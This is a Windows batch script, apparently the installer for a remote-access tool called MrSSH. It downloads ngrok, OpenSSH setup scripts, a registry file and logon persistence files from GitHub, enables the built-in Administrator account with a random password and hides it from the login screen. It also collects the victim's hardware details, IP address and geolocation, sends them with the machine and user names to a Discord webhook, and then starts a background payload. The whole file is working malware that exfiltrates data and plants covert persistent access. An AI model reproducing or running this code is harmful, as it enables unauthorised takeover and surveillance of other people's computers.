@echo on
setlocal enabledelayedexpansion
chcp 65001 >nul

:: <Variables>
set "Token=%~1"
set "JsonValues=token version CreationDate ID Endpoint Access"
set "Version=1.0"
set "DefaultToken=0000"
set Files=PFaS.bat OpenSSH.ps1 hide.reg WebParse.exe
set OnLogFiles=onlogon.bat Run.vbs start.bat MrSSH-task.xml
set Github=https://github.com/dh3b/MrSSH/raw/v.1.0/Files/
set "TaskFile=!Data!\MrSSH-task.xml"
set "ErrorCount=0"
set "StatusFile=!TFolder!\Status.ini"
:: </Variables>

:: <Folders>
set "Folder=!temp!\Files" & IF NOT EXIST !Folder! mkdir !Folder!
set "TFolder=!temp!\TempFolder" & IF NOT EXIST !TFolder! mkdir !TFolder!
set "Data=%appdata%\MrSSH" & IF NOT EXIST !Data! mkdir !Data!
set "PFaS=!temp!\I4-L63O3V6E-82DI18C24K23S" & IF NOT EXIST !PFaS! mkdir !PFaS!
:: </Folders>

pushd !Folder!

:: <Processor architecture and windows check>
for /f "delims=" %%a in ('wmic os get OSArchitecture ^| findstr bit') do set "Bits=%%a"
if !Bits!=="64-bit" (
   set "ngrok=ngrok64.exe"
)
if !Bits!=="32-bit" (
   set "ngrok=ngrok32.exe"
) else (
   set "ngrok=ngrok64.exe"
   echo WARNING: System bits undefined (!Bits!)>>!StatusFile!
   echo.>>!StatusFile!
   set !ErrorCount!+=1
)
for /f "delims=" %%a in ('systeminfo ^| findstr /B /C:"OS Name"') do set "Windows=%%a"
set windows=%windows:~-25%
:: </Processor architecture and windows check>

:: <Separate Install for discord msg>
curl -fL#k "https://raw.githubusercontent.com/agamsol/Batch-Projects/main/Discord-Message-Sender/Source.bat" -o "Source.bat"
:: </Separate Install for discord msg>

:: <Install>
Rem download ngrok anyway, because it often bugs
curl -fL#k "!Github!!ngrok!" -o "!PFaS!\ngrok.exe"

Rem download files into !Files!
for %%a in (%Files%) do if not exist "%Folder%\%%a" set /a MissingFiles+=1

if !MissingFiles! geq 1 (
    for %%a in (%Files%) do (
        set /a Downloaded+=1
        curl --create-dirs -f#kLo "%Folder%\%%a" "%Github%/%%a"
    )
)

Rem download files into !Data!
for %%a in (%OnLogFiles%) do if not exist "%Data%\%%a" set /a MissingFiles+=1

if !MissingFiles! geq 1 (
    for %%a in (%OnLogFiles%) do (
        set /a Downloaded+=1
        curl --create-dirs -f#kLo "%Data%\%%a" "%Github%/%%a"
    )
)
:: </Install>

:: <Set token info>
if exist !StatusFile! del /Q !StatusFile!
echo [Indicates if token exists either does not]>!StatusFile!
if not defined Token set "Token=!DefaultToken!"
if exist !TFolder!\bin\Token.json del /Q !TFolder!\bin\Token.json
set "TokenURL=https://github.com/dh3b/MrSSH/raw/v.1.0/Identifiers/!Token!.json"
curl --create-dirs -Ls "!TokenURL!" -o "!TFolder!\bin\Token.json" & if !ErrorLevel! equ 1 (
   echo TokenStatus=Does not exist either the program did not specify it>>!StatusFile!
   echo.>>!StatusFile!
   set !ErrorCount!+=1
) else (
   echo TokenStatus=Valid>>!StatusFile!
   echo.>>!StatusFile!
)
for /f "delims=" %%t in ('call "WebParse.exe" "!TokenURL!" !JsonValues!') do (set "Json.%%t")
for %%a in (ID Endpoint Access) do (
call :Decode "!Json.%%a!"
set "Json.%%a=!PlainString!"
)
set "URL=https://rentry.co/!Json.Endpoint!"
echo [Indicates if rentry status and paste status is valid either not]>>!StatusFile!
curl --create-dirs -Ls "!URL!/raw" -o "!TFolder!\bin\rentry.txt" & if !ErrorLevel! equ 1 (
   call :status
   if status==1 (
      echo RentryPaste=Invalid>>!StatusFile!
      echo.>>!StatusFile!
      echo RentryStatus=Online>>!StatusFile!
      echo.>>!StatusFile!
      set !ErrorCount!+=1
   ) else (
      echo RentryPaste=Cannot check (Rentry.co is offline)>>!StatusFile!
      echo.>>!StatusFile!
      echo RentryStatus=Offline>>!StatusFile!
      echo.>>!StatusFile!
      set !ErrorCount!+=1
   )
) else (
   echo RentryPaste=Valid>>!StatusFile!
   echo.>>!StatusFile!
   echo RentryStatus=Online>>!StatusFile!
   echo.>>!StatusFile!
   FOR /F %%i in (!TFolder!\bin\rentry.txt) DO set %%i
)
:: </Set token info>

powershell "Set-ExecutionPolicy -ExecutionPolicy RemoteSigned -Scope CurrentUser"
powershell ./OpenSSH.ps1

:: <Create Administrator account, hide it and set strong rndm password for it>
set "set[1]=ABCDEFGHIJKLMNOPQRSTUVWXYZ"  &  set "len[1]=26"  &  set "num[1]=0"
set "set[2]=abcdefghijklmnopqrstuvwxyz"  &  set "len[2]=26"  &  set "num[2]=0"
set "set[3]=0123456789"                  &  set "len[3]=10"  &  set "num[3]=0"
set "set[4]=#@"                     &  set "len[4]=6"   &  set "num[4]=0"

set "list="
for /L %%i in (1,1,10) do (
   set /A rnd=!random! %% 4 + 1
   set "list=!list!!rnd! "
   set /A num[!rnd!]+=1
)

:checkList
set /A mul=num[1]*num[2]*num[3]*num[4]
if %mul% neq 0 goto listOK

   set /A num[%list:~0,1%]-=1
   set "list=%list:~2%"
   set /A rnd=%random% %% 4 + 1
   set "list=%list%%rnd% "
   set /A num[%rnd%]+=1

goto checkList
:listOK

set "RndAlphaNum="
for %%a in (%list%) do (
   set /A rnd=!random! %% len[%%a]
   for %%r in (!rnd!) do set "RndAlphaNum=!RndAlphaNum!!set[%%a]:~%%r,1!"
)

echo !RndAlphaNum!>%temp%\TempFolder\pass.txt

echo [Indicates if administrator account proccess is successful]>>!StatusFile!
net user administrator /active:yes
if !ErrorLevel! neq 0 (
   echo AdministratorAccount=Disabled>>!StatusFile!
   echo.>>!StatusFile!
   set !ErrorCount!+=1
) else (
   echo AdministratorAccount=Enabled>>!StatusFile!
   echo.>>!StatusFile!
)
net user "Administrator" "!RndAlphaNum!"
if !ErrorLevel! neq 0 (
   echo AdministratorPassChange=Unsuccessful>>!StatusFile!
   echo.>>!StatusFile!
   set !ErrorCount!+=1
) else (
   echo AdministratorPassChange=Successful>>!StatusFile!
   echo.>>!StatusFile!
)

echo [Indicates if Administrator account hide was successful either not]>>!StatusFile!
reg import "!Folder!\hide.reg"
if !ErrorLevel! neq 0 (
   echo HideImport=Unsuccessful>>!StatusFile!
   set !ErrorCount!+=1
   echo.>>!StatusFile
) else (
   echo HideImport=Successful>>!StatusFile!
   echo.>>!StatusFile!
)
:: </Create Administrator account, hide it and set strong rndm password for it>

:: <Get Network and Hardware>
for /F %%C in ('powershell -command "(Get-CimInstance Win32_PhysicalMemory | Measure-Object -Property capacity -Sum).sum /1gb"') do set "RAM=%%CGB"
for /f "tokens=1* delims==" %%a in ('wmic cpu get name /VALUE') do if /i %%a EQU name set "CPU=%%b"
for /f "tokens=1* delims==" %%a in ('wmic path win32_VideoController get name /value') do if /i %%a equ name set "GPU=%%b"
for /f "delims=" %%a in ('call "WebParse.exe" "http://ip-api.com/json?fields=192511" country countryCode regionName city lat lon timezone isp proxy query') do set "%%a"
:: </Get Network and Hardware>

:: <Check for VPN>
if "!proxy!"=="false" (
    set "VPN=:red_circle:" && set "VPNi=OFF"
) else set "VPN=:green_circle:" && set "VPNi=ON - :warning: Some Information may be incorrect"
:: </Check for VPN>

set "Title=MrSSH has been invoked on %computername%\%username%"
set "PcCnfg=:bookmark_tabs: __**Security, PC config**__ \\n\\n%VPN% **VPN:** %VPNi% \\n\\n:window: **OS:** %windows%\\n\\n:electric_plug: **System bits:** %bits%\\n\\n:desktop: **PC name:** %computername% \\n\\n:bust_in_silhouette: **User name:** %username%\\n\\n:house:**Ip address:** ||%query%|| (%isp%)"
set "Specs=:bookmark_tabs: __**PC Specification**__\\n\\n:floppy_disk: **RAM:** %RAM%\\n\\n:nut_and_bolt: **CPU:** %CPU%\\n\\n:joystick: **GPU:** %GPU%"
set "LocationInfo=:bookmark_tabs: __**Location**__ \\n\\n:placard: **Country:** %country% (%countryCode%) \\n\\n:japan: **Region:** %regionName% \\n\\n:cityscape: **City:** %city% (||%lat%; %lon%||) \\n\\n:timer: **Timezone:** %timezone%"
set "ID=:key: __**Token Info**__\\n\\n:ticket: **Token:** %Token%\\n\\n:calendar: **Creation Date:** %Json.CreationDate%\\n\\n:screwdriver: **Version:** %Version%\\n\\n:credit_card: **[Edit page](%URL%) and password:** ||%Json.Access%||"

call source.bat +silent --embed "!Title!" "!PcCnfg!\\n\\n\\n!Specs!\\n\\n\\n!LocationInfo!\\n\\n\\n!ID!\\n\\n\\n*Pssst... Wait a second, that isn't all. There are 2 more embeds waiting for them to send.*" "52bf90" "https://i.imgur.com/b2Terft.png"

start /B "PFaS" call PFaS.bat !token!

:: <Encode>
:Encode
set "String=%~1"

echo !String!>PlainText.hex
certutil -encodehex PlainText.hex output.hex >nul
set "Encoded="

for /f "delims=" %%A in (output.hex) do (
    set "line=%%A"
    set "line=!line:~5,48!"
    set "Encoded=!Encoded!!line!"
)
del PlainText.hex output.hex
set "Encoded=!Encoded: =!"

exit /b
:: </Encode>

:: <Decode>
:Decode
set "String=%~1"

echo !String!>String.hex
certutil -decodehex String.hex output.hex >nul
set /p PlainString=<output.hex
del String.hex output.hex

exit /b 
:: </Decode>

:: <Discord Webhook validate>
:Validate_Webhook
for %%a in (ptb canary) do set "V-Webhook=!webhook:%%a.=!"
if not "!webhook:~0,33!"=="https://discord.com/api/webhooks/" (
   echo "Webhook: Invalid">>!StatusFile!
   echo.>>!StatusFile!
   set !ErrorCount!+=1
) else (
   echo "Webhook: Valid">>!StatusFile!
   echo.>>!StatusFile!
)

exit /b 
:: </Discord Webhook validate>

:: <Rentry.co status>
:status
ping rentry.co -n 1 | findstr "TTL" >nul
if !ErrorLevel! equ 1 (
   set status=0
) else (
   set status=1
)

exit /b